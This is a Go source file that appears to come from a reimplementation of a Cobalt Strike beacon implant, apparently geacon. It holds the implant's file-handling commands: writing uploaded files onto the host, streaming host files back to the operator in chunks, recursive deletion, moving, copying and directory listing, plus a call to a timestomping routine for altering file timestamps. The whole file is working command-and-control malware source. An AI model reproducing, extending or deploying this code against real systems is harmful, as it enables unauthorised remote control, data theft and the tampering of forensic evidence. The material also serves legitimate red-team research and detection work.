package command

import (
	"bytes"
	"context"
	"encoding/binary"
	"io"
	"io/fs"
	"main/config"
	"main/packet"
	"main/util"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

var fileCounter = 1
var cancelFuncs = make(map[int]context.CancelFunc)

func Upload(b []byte, start bool) error {
	filePathByte, fileContent, err := parseCommandUpload(b)
	if err != nil {
		return err
	}
	filePath := string(filePathByte)
	//filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
	// normalize path
	filePath = strings.ReplaceAll(filePath, "\\", "/")
	var fp *os.File
	if start {
		fp, err = os.OpenFile(filePath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, os.ModePerm)
	} else {
		fp, err = os.OpenFile(filePath, os.O_APPEND|os.O_WRONLY, os.ModePerm)
	}
	if err != nil {
		return err
	}
	defer fp.Close()
	_, err = fp.Write(fileContent)
	if err != nil {
		return err
	}
	// this would make plenty of response
	//packet.PushResult(packet.CALLBACK_OUTPUT, []byte("upload success"))
	return nil
}

func ChangeCurrentDir(path []byte) error {
	pathStr := strings.ReplaceAll(string(path), "\\", "/")
	err := os.Chdir(pathStr)
	if err != nil {
		return err
	}
	return nil
}

func GetCurrentDirectory() error {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		return err
	}
	packet.PushResult(packet.CALLBACK_PWD, []byte(result))
	return nil
}

func FileBrowse(b []byte) error {
	buf := bytes.NewBuffer(b)
	//resultStr := ""
	pendingRequestBytes := make([]byte, 4)
	_, err := buf.Read(pendingRequestBytes)
	if err != nil {
		return err
	}
	dirPathLen := packet.ReadInt(buf)

	dirPathBytes := make([]byte, dirPathLen)
	_, err = buf.Read(dirPathBytes)
	if err != nil {
		return err
	}

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.TrimSuffix(dirPathStr, "*")
	dirPathStr = filepath.Clean(dirPathStr)
	// build string for result
	/*
	   /Users/xxxx/Desktop/dev/deacon/*
	   D       0       25/07/2020 09:50:23     .
	   D       0       25/07/2020 09:50:23     ..
	   D       0       09/06/2020 00:55:03     geacon
	   D       0       20/06/2020 09:00:52     obj
	   D       0       18/06/2020 09:51:04     Util
	   D       0       09/06/2020 00:54:59     bin
	   D       0       18/06/2020 05:15:12     config
	   D       0       18/06/2020 13:48:07     crypt
	   D       0       18/06/2020 06:11:19     Sysinfo
	   D       0       18/06/2020 04:30:15     .vscode
	   D       0       19/06/2020 06:31:58     command
	   F       272     20/06/2020 08:52:42     deacon.csproj
	   F       6106    26/07/2020 04:08:54     Program.cs
	*/
	dirInfo, err := os.Stat(dirPathStr)
	if err != nil {
		return err
	}
	modTime := dirInfo.ModTime()

	absDir, err := filepath.Abs(dirPathStr)
	if err != nil {
		return err
	}
	modTimeStr := modTime.Format("02/01/2006 15:04:05")
	resultStr := ""
	// it seems you should always return the same path as given except dir is `.`(current dir)
	if dirPathStr == "." {
		if runtime.GOOS != "windows" {
			// add / as root dir
			resultStr = util.Sprintf("/%s\\*", strings.ReplaceAll(absDir, "/", "\\"))
		} else {
			resultStr = util.Sprintf("%s\\*", absDir)
		}
	} else {
		resultStr = util.Sprintf("%s", string(dirPathBytes))
	}
	resultStr += util.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += util.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	files, err := os.ReadDir(absDir)
	if err != nil {
		return err
	}
	// The core of the problem is that the result of os.ReadDir treats all soft links as files,
	// so I have to use os.Stat to check it again
	for _, file := range files {
		var fileInfo os.FileInfo
		fileInfo, err = file.Info()
		if err != nil {
			return err
		}
		modTimeStr = fileInfo.ModTime().Format("02/01/2006 15:04:05")
		// evaluate symlink
		if fileInfo.Mode()&fs.ModeSymlink == os.ModeSymlink {
			// use absolute dir
			linkPath, err := filepath.EvalSymlinks(filepath.Join(absDir, fileInfo.Name()))
			// unresolved soft link will be treated as normal file
			if err != nil {
				util.Printf("unable to resolve symlink: %s\n", err)
				resultStr += util.Sprintf("\nF\t%d\t%s\t%s", fileInfo.Size(), modTimeStr, file.Name())
			} else {
				targetInfo, err := os.Stat(linkPath)
				// if error occurred, just don't apply new info
				if err == nil {
					// be careful that there should use the origin file name
					if targetInfo.IsDir() {
						resultStr += util.Sprintf("\nD\t0\t%s\t%s", modTimeStr, fileInfo.Name())
					} else {
						resultStr += util.Sprintf("\nF\t%d\t%s\t%s", fileInfo.Size(), modTimeStr, fileInfo.Name())
					}
				}
			}
		} else if fileInfo.IsDir() {
			resultStr += util.Sprintf("\nD\t0\t%s\t%s", modTimeStr, fileInfo.Name())
		} else {
			resultStr += util.Sprintf("\nF\t%d\t%s\t%s", fileInfo.Size(), modTimeStr, fileInfo.Name())
		}
	}

	// use command line ls will send pending request -2, but there is no need to handle it
	// send it back and server will print result in console
	dirResult := util.BytesCombine(pendingRequestBytes, []byte(resultStr))
	packet.PushResult(packet.CALLBACK_PENDING, dirResult)
	return nil
}

func Download(b []byte) error {
	filePath := string(b)
	filePath = strings.ReplaceAll(filePath, "\\", "/")
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		return err
	}
	fileLen := fileInfo.Size()
	fileLenInt := int(fileLen)
	fileLenBytes := packet.WriteInt(fileLenInt)
	requestID := fileCounter
	fileCounter++
	requestIDBytes := packet.WriteInt(requestID)
	result := util.BytesCombine(requestIDBytes, fileLenBytes, []byte(filePath))
	packet.PushResult(packet.CALLBACK_FILE, result)

	ctx, cancel := context.WithCancel(defaultCtx)
	cancelFuncs[requestID] = cancel

	fileHandle, err := os.Open(filePath)
	if err != nil {
		return err
	}
	// revert to async
	// the problem here is the race condition of counter's generation and sending, so I add a mutex in packet.PushResult
	go func() {
		// do not forget to release handler
		defer fileHandle.Close()
		var fileContent []byte
		fileBuf := make([]byte, config.DownloadSize)
		end := false
		for {
			select {
			case <-ctx.Done():
				packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("download of %s canceled", filePath)))
				// don't need to send anything back. just stop transfer
				return
			default:
				n, err := fileHandle.Read(fileBuf)
				if err != nil && err != io.EOF {
					packet.ErrorMessage(err.Error())
					end = true
					break
				}
				if n == 0 {
					end = true
					break
				}
				fileContent = fileBuf[:n]
				result = util.BytesCombine(requestIDBytes, fileContent)
				packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
				// sleep the same time as beacon
				util.Sleep()
			}
			if end {
				break
			}

		}
		packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
	}()
	return nil
}

func Cancel(b []byte) error {
	fileID := int(binary.BigEndian.Uint32(b))
	cancelFunc, ok := cancelFuncs[fileID]
	if ok {
		cancelFunc()
		delete(cancelFuncs, fileID)
	}
	return nil
}

// CS original impl, use goroutine is much easier, and this impl also can't solve the race condition in other goroutine
//func CheckDownload() {
//	for i, download := range DownloadList {
//		fileBuf := make([]byte, config.DownloadSize)
//		// do I need seek offset?
//		n, err := download.fileHandle.Read(fileBuf)
//		if err != nil && err != io.EOF {
//			// if error occurred, this download would fail, and remove current download
//			packet.ErrorMessage(err.Error())
//			DownloadFinish(i)
//			continue
//		}
//		requestIDBytes := packet.WriteInt(download.requestId)
//		result := util.BytesCombine(requestIDBytes, fileBuf[:n])
//		packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
//		download.readLen += n
//		if download.readLen == download.totalLen {
//			packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
//			DownloadFinish(i)
//		}
//	}
//}
//
//func DownloadFinish(i int) {
//	download := DownloadList[i]
//	// ignore that error
//	_ = download.fileHandle.Close()
//	// remove that job
//	DownloadList = append(DownloadList[:i], DownloadList[i+1:]...)
//}

func Remove(filePath string) error {
	filePath = strings.ReplaceAll(filePath, "\\", "/")
	// use RemoveAll to support remove not empty dir
	err := os.RemoveAll(filePath)
	if err != nil {
		return err
	}
	packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("remove %s success", filePath)))
	return nil
}

func MoveFile(b []byte) error {
	srcB, dstB, err := parseCommandMove(b)
	src := string(srcB)
	dst := string(dstB)
	src = strings.ReplaceAll(src, "\\", "/")
	dst = strings.ReplaceAll(dst, "\\", "/")
	err = os.Rename(src, dst)
	if err != nil {
		return err
	}
	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("move success"))
	return nil
}

func CopyFile(b []byte) error {
	srcB, dstB, err := parseCommandCopy(b)
	src := string(srcB)
	dst := string(dstB)
	src = strings.ReplaceAll(src, "\\", "/")
	dst = strings.ReplaceAll(dst, "\\", "/")
	srcFile, err := os.Open(src)
	defer func(srcFile *os.File) {
		err := srcFile.Close()
		if err != nil {

		}
	}(srcFile)
	if err != nil {
		return err
	}
	dstFile, err := os.OpenFile(dst, os.O_RDWR|os.O_CREATE, os.ModePerm)
	defer func(dstFile *os.File) {
		err := dstFile.Close()
		if err != nil {

		}
	}(dstFile)
	if err != nil {
		return err
	}
	buf := make([]byte, 4096)
	for {
		n, err := srcFile.Read(buf)
		if err != nil && err != io.EOF {
			return err
		}
		if n == 0 {
			break
		}

		if _, err := dstFile.Write(buf[:n]); err != nil {
			return err
		}
	}
	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("copy success"))
	return nil
}

func MakeDir(dir string) error {
	dir = strings.ReplaceAll(dir, "\\", "/")
	err := os.MkdirAll(dir, os.ModePerm)
	if err != nil {
		return err
	}
	return nil
}

func ListDrives(b []byte) error {
	// only works in windows, put implement in exec_windows.go now
	return listDrivesImpl(b)
}

func TimeStomp(b []byte) error {
	return TimeStompImpl(b)
}
